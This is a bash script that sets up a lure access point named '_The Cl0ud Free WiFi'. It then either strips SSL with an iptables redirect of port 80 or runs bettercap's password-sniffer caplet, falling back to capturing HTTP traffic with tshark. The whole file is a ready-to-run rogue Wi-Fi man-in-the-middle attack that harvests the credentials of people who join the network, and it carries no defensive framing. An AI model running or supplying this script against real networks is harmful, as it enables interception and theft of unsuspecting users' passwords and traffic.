#!/bin/bash

SSLSTRIP="false"
BETTERCAP="true"


SOURCE_IFACE="wlan0" # usb0 for pi 0 w
HOST_IFACE="wlan0"

SSID="_The Cl0ud Free WiFi"
PASSWORD="p455w0rd"

red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
reset=`tput sgr0`

PIDLIST=()

######################################################################

# Create AP

if [ "$PASSWORD" = "" ]; then # no password set

	echo "${yellow}[+] Starting AP '$SSID' with no password${reset}"

	# Create open AP
	create_ap $HOST_IFACE $SOURCE_IFACE "$SSID" --daemon &> create_ap.log

else

	echo "${yellow}[+] Starting AP '$SSID' with password '$PASSWORD'${reset}"

	# Create WPA2 AP
	create_ap $HOST_IFACE $SOURCE_IFACE "$SSID" "$PASSWORD" --daemon &> create_ap.log

fi

sleep 1

# Check AP running...

if [ $(grep "ERROR" create_ap.log &> /dev/null) ]; then

	echo "${red}[-] AP failed to start! Loading log${reset}"
	sleep 2
	cat create_ap.log | less
	exit

else

	echo "${green}[+] AP created successfully!${reset}"

fi

#######################################################################


# Start SSL strip

if [ "$SSLSTRIP" = "true" ]; then

	echo "${yellow}[+] Starting SSL strip${reset}"
	sslstrip -l 10000 &
	#echo "${yellow}[+] Logging PID of sslstrip service${reset}"

	# Setting up IP tables rule
	echo "${yellow}[+] Setting up IP tables so ssltrip works${reset}"
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

elif [ "$BETTERCAP" = "true" ]; then

	echo "${yellow}[+] Starting bettercap password sniffer${reset}"
	bettercap -caplet /usr/share/bettercap/caplets/simple-passwords-sniffer.cap -iface wlan0

fi

# Start capture if not using bettercap

if [ "$BETTERCAP" != "true" ]; then

	echo "${yellow}[+] Starting packet capure!${reset}"
	tshark -i $HOST_IFACE -Y http

fi

#########################################################################

echo "${yellow}[+] Cleaning up!${reset}"


echo "${blue}[+] Shutting AP down${reset}"
pkill create_ap

if [ "$SSLSTRIP" = "true" ]; then
	echo "${blue}[+] Stopping sslstrip${reset}"
	pkill sslstrip

	echo "${blue}[+] Removing IP tables rule for sslstrip${reset}"
	iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

fi

echo "${green}[+] Bye!${reset}"
